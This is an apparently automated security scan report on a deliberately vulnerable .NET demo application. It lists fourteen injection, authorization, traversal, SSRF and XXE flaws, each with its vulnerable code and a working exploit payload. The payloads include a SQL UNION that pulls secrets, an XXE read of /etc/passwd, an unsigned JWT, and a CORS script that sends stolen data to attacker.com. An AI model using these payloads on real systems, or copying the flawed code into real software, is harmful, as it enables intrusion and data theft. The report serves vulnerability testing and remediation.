# 🔒 CodeMender Security Report

*Generated: 2026-08-25 14:10:07 UTC*

## Summary

**Total findings: 14**

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 2 |
| 🟠 HIGH | 12 |

| Status | Count |
|--------|-------|
| 🔴 OPEN | 14 |

## Findings

| ID | Severity | Confidence | Status | Fix | File | Title |
|----|----------|------------|--------|-----|------|-------|
| `5a957927` | 🔴 CRITICAL | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableCommandService.cs` | Remote Code Execution via OS Command Injection |
| `ab2fcc60` | 🔴 CRITICAL | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableDatabaseService.cs` | SQL Injection via Direct String Concatenation in Database Queries |
| `1fdf3816` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/MissingAuthorizationController.cs` | Missing Authorization / Authentication on Administrative Endpoints |
| `bc7ca318` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableNoSQLService.cs` | NoSQL Injection via Raw JSON Query Concatenation |
| `76e22981` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Program.cs` | Permissive CORS Policy with Credentials Allowed |
| `9c9fe970` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/VulnerableJwtController.cs` | JWT Signature Bypass via Missing Cryptographic Verification |
| `d8ecc130` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/VulnerableUserProfileController.cs` | Insecure Direct Object Reference (IDOR) in User Profile Retrieval |
| `e52a840c` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/IdorController.cs` | Privilege Escalation via Mass Assignment of Roles during User Registration |
| `28097182` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/VulnerableFileUploadController.cs` | Stored Cross-Site Scripting (XSS) via Unvalidated File Serving as text/html |
| `93ef8e6b` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/XxeInjectionController.cs` | XML External Entity (XXE) Injection via DTD and XmlUrlResolver Enablement |
| `e765662a` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/PathTraversalController.cs` | Arbitrary File Read via Path Traversal |
| `0814bda1` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/SsrfController.cs` | Server-Side Request Forgery (SSRF) via Unvalidated URL Fetching |
| `86ad05e6` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/ZipSlipController.cs` | Zip Slip / Path Traversal via Unvalidated Archive Extraction |
| `41a30a92` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/ArbitraryFileWriteController.cs` | Arbitrary File Write via Path Traversal |

## Details

### 1. 🔴 Remote Code Execution via OS Command Injection (`5a957927`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: Command Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableCommandService.cs` (L33–44)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ExecuteCommandVulnerable` function in `VulnerableCommandService` is vulnerable to Command Injection.

The code dynamically constructs the command shell arguments string by directly embedding user-provided input `userInput` using string interpolation without sanitization or escaping:
On Windows: `processInfo.Arguments = $"/c echo Processing: {userInput}";` (line 36)
On Linux/macOS: `processInfo.Arguments = $"-c \"echo Processing: {userInput}\"";` (line 41)

When the process is executed using `Process.Start(processInfo)` (line 44) under shell execution processes (like `cmd.exe` or `/bin/sh`), attackers can inject shell command delimiters (such as `&`, `&&`, `|`, `;`) followed by arbitrary system commands, resulting in Remote Code Execution (RCE) on the application server.

Conceptual Exploit Payload:
To execute the `whoami` command, an attacker can input:
`test && whoami`

On Linux/macOS, this translates to:
`/bin/sh -c "echo Processing: test && whoami"`
Which outputs the result of the `whoami` command.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                processInfo.FileName = "cmd.exe";
                processInfo.Arguments = $"/c echo Processing: {userInput}";
            }
            else
            {
                processInfo.FileName = "/bin/sh";
                processInfo.Arguments = $"-c \"echo Processing: {userInput}\"";
            }

            using var process = Process.Start(processInfo);
```

</details>

---

### 2. 🔴 SQL Injection via Direct String Concatenation in Database Queries (`ab2fcc60`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableDatabaseService.cs` (L67–80)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `SearchUserVulnerable` method in `VulnerableDatabaseService` is vulnerable to SQL Injection (SQLi) because it dynamically builds a SQLite query by directly concatenating user-supplied input:
`var sql = $"SELECT * FROM Users WHERE Username = '{username}' AND IsActive = 1";` (line 74).

This query is subsequently executed via `command.ExecuteReader()` (line 79) without parameterization or validation. This allows attackers to manipulate the logic of the query by injecting SQLite commands and query operators (e.g., `' OR '1'='1` or `UNION SELECT`). 

An attacker can exploit this SQL Injection vulnerability to bypass queries, read all records in the `Users` database table, or use `UNION` statements to exfiltrate database contents from other tables (such as the `Secrets` table containing API keys and passwords).

Conceptual Exploit Payload:
To extract the secrets table, an attacker can input:
`xxx' UNION SELECT Id, SecretKey, SecretValue, 'SECRET', 1 FROM Secrets --`

Which resolves to the following query:
`SELECT * FROM Users WHERE Username = 'xxx' UNION SELECT Id, SecretKey, SecretValue, 'SECRET', 1 FROM Secrets --' AND IsActive = 1`

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: String concatenation - SQL Injection vulnerability
    public string SearchUserVulnerable(string username)
    {
        EnsureInitialized();

        try
        {
            // DANGEROUS: Direct string concatenation with additional WHERE condition
            var sql = $"SELECT * FROM Users WHERE Username = '{username}' AND IsActive = 1";
            
            using var command = _connection.CreateCommand();
            command.CommandText = sql;

            using var reader = command.ExecuteReader();
```

</details>

---

### 3. 🔴 Missing Authorization / Authentication on Administrative Endpoints (`1fdf3816`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/MissingAuthorizationController.cs` (L24–47)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `MissingAuthorizationController` exposes two highly sensitive administrative endpoints: `GetAllUsers` (`/api/vulnerabilities/missing-authorization/users` at line 24) and `DeleteUser` (`/api/vulnerabilities/missing-authorization/delete-user` at line 40).

Neither endpoint contains any authentication or authorization middleware, nor do they check for user identity or claims. They can be reached by any anonymous, unauthenticated external client, exposing confidential information (such as user credentials, e.g. `Password = "hashed123"`) or allowing destructive actions (deleting users).

Conceptual Exploit Payload:
GET /api/vulnerabilities/missing-authorization/users HTTP/1.1
Host: localhost

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: No authorization check!
    [HttpGet("users")]
    public IActionResult GetAllUsers()
    {
...
    // VULNERABLE: No authorization check on dangerous operation!
    [HttpDelete("delete-user")]
    public IActionResult DeleteUser([FromQuery] int id)
    {
```

</details>

---

### 4. 🔴 NoSQL Injection via Raw JSON Query Concatenation (`bc7ca318`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableNoSQLService.cs` (L57–89)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `AuthenticateUserVulnerable` method in `VulnerableNoSQLService` is vulnerable to NoSQL Injection (NoSQLi).

The vulnerability exists because user inputs are directly concatenated to construct a raw JSON string query:
`var queryJson = $"{{ \"username\": {username}, \"password\": {password} }}";` (line 63).

Because the variables `username` and `password` are injected without quotes or escaping, an attacker can supply JSON payloads that alter the structure of the deserialized JSON document (line 66). This enables them to inject MongoDB-like operators such as `$ne` (not equal), `$regex`, or `$gt`, which are supported by the application's manual filter parsing loop (lines 117-173).

For instance, an attacker can pass a payload containing `{ "$ne": "" }` to bypass password verification, allowing unauthorized authentication access to arbitrary accounts.

Conceptual Exploit Payload:
To log in as the admin user without knowing the password:
`username` = `"admin"`
`password` = `{"$ne": ""}`

This compiles the query JSON into:
`{ "username": "admin", "password": {"$ne": ""} }`
Which evaluates to matching any user named "admin" whose password is not empty, successfully bypassing authentication.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // DANGEROUS: Building query by concatenating user input into JSON string
            // User input is NOT escaped, allowing injection of JSON operators
            var queryJson = $"{{ \"username\": {username}, \"password\": {password} }}";
            
            // Parse and deserialize - attackers can inject operators here!
            var jsonDoc = System.Text.Json.JsonSerializer.Deserialize<JsonDocument>(queryJson);
```

</details>

---

### 5. 🔴 Permissive CORS Policy with Credentials Allowed (`76e22981`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Program.cs` (L36–43)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The application defines a highly permissive Cross-Origin Resource Sharing (CORS) policy called `VulnerablePolicy` in `Program.cs` (lines 36-43).

The configuration uses `.SetIsOriginAllowed(_ => true)` to accept any origin dynamically, while simultaneously calling `.AllowCredentials()` (line 42). This configuration mirrors whatever origin is supplied in the client's `Origin` header and sends `Access-Control-Allow-Credentials: true`. 

When this policy is applied to sensitive controllers/endpoints (such as `CorsMisconfigurationController` via `[EnableCors("VulnerablePolicy")]`), any third-party malicious website visited by an authenticated user can make credentialed requests (using cookies or Windows Authentication) to the application and read back the sensitive responses, completely bypassing the Same-Origin Policy.

Conceptual Exploit Payload:
A malicious webpage hosted at `http://attacker.com` executes the following JavaScript:

fetch('https://localhost:7124/api/user/balance', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Exfiltrate sensitive balance and API keys to the attacker
  fetch('http://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // DANGEROUS: Reflects any origin with credentials
    options.AddPolicy("VulnerablePolicy", policy =>
    {
        policy
            .SetIsOriginAllowed(_ => true) // CRITICAL: Allows ALL origins!
            .AllowAnyMethod()
            .AllowAnyHeader()
            .AllowCredentials(); // With credentials = VERY DANGEROUS!
    });
```

</details>

---

### 6. 🔴 JWT Signature Bypass via Missing Cryptographic Verification (`9c9fe970`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/VulnerableJwtController.cs` (L22–98)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ValidateToken` endpoint in `VulnerableJwtController` performs manual JWT decoding but fails to implement any cryptographic signature validation.

The code decodes the header and payload base64 sections directly (lines 32-37) and completely bypasses the signature section of the token (if one is even present). It treats the token as valid regardless of whether a valid signature was provided. Specifically, it explicitly accepts JWTs with:
1. `alg` header set to `"none"` (lines 44-56).
2. Completely omitted signatures (only 2 parts, lines 58-69).
3. Modified payloads (e.g. `role: "admin"`, lines 71-87).

This allows an attacker to construct or alter any token to contain arbitrary privileges (such as a role of `"admin"`), completely bypassing authentication/authorization controls.

Conceptual Exploit Payload:
An attacker can craft a JWT with a header set to `{"alg": "none", "typ": "JWT"}` and a payload set to `{"user": "attacker", "role": "admin"}` with no signature:

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.

POST /api/jwt/validate HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "Token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ."
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // Decode payload (NO SIGNATURE VALIDATION!)
            var payloadJson = Encoding.UTF8.GetString(Convert.FromBase64String(AddPadding(parts[1])));
            var payload = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(payloadJson);
```

</details>

---

### 7. 🔴 Insecure Direct Object Reference (IDOR) in User Profile Retrieval (`d8ecc130`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/VulnerableUserProfileController.cs` (L75–84)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `GetProfile` action in `VulnerableUserProfileController` is vulnerable to Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA).

The application accepts a user-controlled `id` parameter as part of the URL route `/api/user/profile/{id}` (lines 64-65) and directly fetches the corresponding `UserProfile` from a lookup dictionary (line 70). Even though the comments simulate a logged-in user with `currentUserId = 5` (line 68), the controller does not verify if the current user has the authority to view the requested `id`. It directly returns the requested user's sensitive details (such as `Ssn`, `Salary`, `CreditCard`, `BankAccount`, and `MedicalRecords`) in the response (lines 78-83).

An attacker logged in with a low-privileged account (such as ID 5) can iterate through the sequential user IDs (1, 2, 3, etc.) to access other users' highly confidential profiles and private data.

Conceptual Exploit Payload:
GET /api/user/profile/1 HTTP/1.1
Host: localhost

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
        // VULNERABILITY: No ownership verification!
        // The application returns any user's data without checking
        // if the current user (ID 5) has permission to access it
        return Ok(new
        {
            success = true,
            authorized = id == currentUserId,
            data = user
        });
```

</details>

---

### 8. 🔴 Privilege Escalation via Mass Assignment of Roles during User Registration (`e52a840c`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/IdorController.cs` (L55–63)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `IdorController` contains a `Register` endpoint (lines 43-75) that is vulnerable to Mass Assignment / Privilege Escalation.

The endpoint accepts a `RegistrationRequest` that includes a client-controlled `Role` field (line 82). In the registration handler, the role parameter is directly mapped onto the created user object:
`Role = request.Role ?? "User" // User can control this!` (line 62).

This allows an external, unauthenticated, or unprivileged client to escalate their privileges during registration by supplying high-privilege roles such as `"Admin"` or `"SuperAdmin"`, bypassing intended role assignments or administrative approval mechanisms.

Conceptual Exploit Payload:
POST /api/vulnerabilities/idor/register HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "Username": "attacker",
  "Email": "attacker@example.com",
  "Password": "password123",
  "Role": "Admin"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
        // VULNERABILITY: Directly using user-provided role without validation
        var user = new User
        {
            Id = new Random().Next(1000, 9999),
            Name = request.Username,
            Email = request.Email,
            Password = $"hashed_{request.Password}",
            Role = request.Role ?? "User" // User can control this!
        };
```

</details>

---

### 9. 🔴 Stored Cross-Site Scripting (XSS) via Unvalidated File Serving as text/html (`28097182`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/VulnerableFileUploadController.cs` (L72–75)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableFileUploadController` is highly vulnerable to Stored Cross-Site Scripting (XSS). 

The `Upload` action (lines 23-54) allows any user to post a filename and plain text content to the server, saving it into a local file without any validation. Crucially, the `ViewFile` action (lines 57-75) retrieves the file's bytes and always returns them with the MIME type forced to `"text/html"` (line 74), regardless of the actual uploaded file type or extension:
`return File(fileBytes, "text/html");`

An attacker can exploit this by uploading raw HTML content containing malicious JavaScript (e.g., `<script>alert(document.cookie)</script>`). When any user visits the returned `viewUrl` (e.g., `/api/files/view/{fileId}`), the browser receives the content with a `text/html` response header and executes the malicious script in the context of the user's session, leading to Session Hijacking, phishing, or other client-side attacks.

Conceptual Exploit Payload:
First, the attacker uploads the malicious payload:
POST /api/files/upload HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "Filename": "exploit.html",
  "Content": "<html><body><script>alert('Stored XSS: ' + document.domain)</script></body></html>"
}

The server responds with a `fileId` (e.g. `12345-abcde`).
Then, triggering the payload:
GET /api/files/view/12345-abcde HTTP/1.1
Host: localhost

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
        // VULNERABLE: Always serves as text/html without validation!
        // This allows XSS when HTML files with scripts are uploaded
        return File(fileBytes, \"text/html\");
```

</details>

---

### 10. 🔴 XML External Entity (XXE) Injection via DTD and XmlUrlResolver Enablement (`93ef8e6b`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Controllers/XxeInjectionController.cs` (L56–60)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `XxeInjectionController` contains two endpoints (`ProcessUserXml` at `/api/xxe/process-user` and `ParseXml` at `/api/xxe/parse`) that are highly vulnerable to XML External Entity (XXE) Injection. 

In `ProcessUserXml` (lines 44-91), the controller instantiates an `XmlDocument`, explicitly sets `XmlResolver` to an instance of `XmlUrlResolver()` (line 58), and then calls `doc.LoadXml(request.XmlContent)` (line 59). By enabling DTD resolution and custom resolvers, modern .NET protections against XXE are explicitly deactivated.

In `ParseXml` (lines 147-201), the controller configures `XmlReaderSettings` to set `DtdProcessing = DtdProcessing.Parse` and `XmlResolver = new XmlUrlResolver()` (lines 162-163), then parses the input using `XmlReader.Create(stringReader, settings)` (line 167) and loads it into an `XmlDocument`.

An attacker can leverage these misconfigurations to perform XXE Injection attacks. This can result in:
1. Local File Disclosure: Retrieving sensitive local files via standard `file://` URIs or UNC paths.
2. Server-Side Request Forgery (SSRF): Triggering HTTP requests from the host server.

Conceptual Exploit Payload:
POST /api/xxe/process-user HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "XmlContent": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><name>&xxe;</name><email>test@example.com</email><bio>bio</bio></user>"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // VULNERABLE: Explicitly enabling XmlResolver
            var doc = new XmlDocument();
            doc.XmlResolver = new XmlUrlResolver(); // DANGEROUS!
            doc.LoadXml(request.XmlContent);
```

</details>

---

### 11. 🔴 Arbitrary File Read via Path Traversal (`e765662a`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/PathTraversalController.cs` (L44–53)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `DownloadFile` action in `PathTraversalController` is vulnerable to Arbitrary File Read via Path Traversal. 

The application takes a user-supplied `filename` parameter and combines it directly with the server's documents directory using `Path.Combine(DocumentsPath, filename)` (line 45) without performing any canonicalization or bounds checking. It then reads and returns the file content via `System.IO.File.ReadAllText(filePath)` (line 52).

An attacker can exploit this by passing directory traversal sequences (such as `../` or `..\\`) inside the `filename` parameter. This enables them to escape the intended base directory (`DocumentsPath`) and read sensitive files from the server, such as configuration files (`appsettings.json`), system credentials, or source files.

Conceptual Exploit Payload:
GET /api/vulnerabilities/path-traversal/download?filename=../appsettings.json HTTP/1.1
Host: localhost

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
        // VULNERABLE: User input directly concatenated to path
        var filePath = Path.Combine(DocumentsPath, filename);
...
        var fileContent = System.IO.File.ReadAllText(filePath);
```

</details>

---

### 12. 🔴 Server-Side Request Forgery (SSRF) via Unvalidated URL Fetching (`0814bda1`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: SSRF
- **File**: `DotnetSecurityFailures/Controllers/SsrfController.cs` (L41–43)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `FetchUrl` action in `SsrfController` is vulnerable to Server-Side Request Forgery (SSRF). 

The application accepts a user-controlled `url` query parameter and initiates an outgoing HTTP request to it via `_httpClient.GetAsync(url)` (line 42) without validating or restricting the target destination. This allows attackers to coerce the server into making unauthorized requests to internal endpoints, loopback interfaces (e.g., `http://127.0.0.1/`), cloud metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/`), or external resources.

Conceptual Exploit Payload:
GET /api/vulnerabilities/ssrf/fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: localhost

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // VULNERABLE: Fetches ANY URL without validation
            var response = await _httpClient.GetAsync(url);
```

</details>

---

### 13. 🔴 Zip Slip / Path Traversal via Unvalidated Archive Extraction (`86ad05e6`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/ZipSlipController.cs` (L60–85)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ExtractZip` action in `ZipSlipController` is vulnerable to the Zip Slip vulnerability (a form of Path Traversal). 

When extracting entries from the uploaded ZIP archive, the application resolves the target file path by combining the base extraction directory with each entry's name using `Path.Combine(ExtractDirectory, entry.FullName)` (line 61) without validating that the final path remains inside `ExtractDirectory`. It then proceeds to create directories and extract the file to the target `fullPath` using `entry.ExtractToFile(fullPath, overwrite: true)` (line 84).

An attacker can construct a malicious ZIP archive containing file paths with directory traversal sequences (e.g., `../../evil.txt`). When this ZIP archive is uploaded and processed, the file is written to an arbitrary location on the application host (such as the web root or key system directories), leading to arbitrary file write, configuration tampering, or remote code execution.

Conceptual Exploit Payload:
A POST request with `multipart/form-data` containing a ZIP file with a compressed entry named `../../evil.txt` sent to the `/api/zip/extract` endpoint:

POST /api/zip/extract HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=boundary

--boundary
Content-Disposition: form-data; name="zipFile"; filename="malicious.zip"
Content-Type: application/zip

[ZIP bytes containing entry: "../../evil.txt"]
--boundary--

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
                    // VULNERABLE: No validation before extraction
                    var fullPath = Path.GetFullPath(Path.Combine(ExtractDirectory, entry.FullName));
...
                        entry.ExtractToFile(fullPath, overwrite: true);
```

</details>

---

### 14. 🔴 Arbitrary File Write via Path Traversal (`41a30a92`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/ArbitraryFileWriteController.cs` (L45–49)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `SaveBackup` endpoint in `ArbitraryFileWriteController` allows an attacker to write files outside of the intended `Backups` directory. The application takes a user-controlled `request.FileName` and directly combines it with `_baseDirectory` using `Path.Combine` (line 46) and then writes arbitrary text content using `System.IO.File.WriteAllText(filePath, request.Content)` (line 48) without sanitizing or validating that the resulting path is within the allowed base directory structure.

An attacker can exploit this path traversal vulnerability by using directory traversal sequences (e.g., `../` or `..\\`) in the `FileName` property, enabling them to overwrite sensitive system configurations or write executable files (such as web shells) into arbitrary locations on the filesystem.

Conceptual Exploit Payload:
POST /api/vulnerabilities/arbitrary-file-write/save HTTP/1.1
Host: localhost
Content-Type: application/json

{
  "FileName": "../evil.txt",
  "Content": "Arbitrary content"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // VULNERABLE: Direct path concatenation without validation
            var filePath = Path.Combine(_baseDirectory, request.FileName);
            
            System.IO.File.WriteAllText(filePath, request.Content);
```

</details>

---

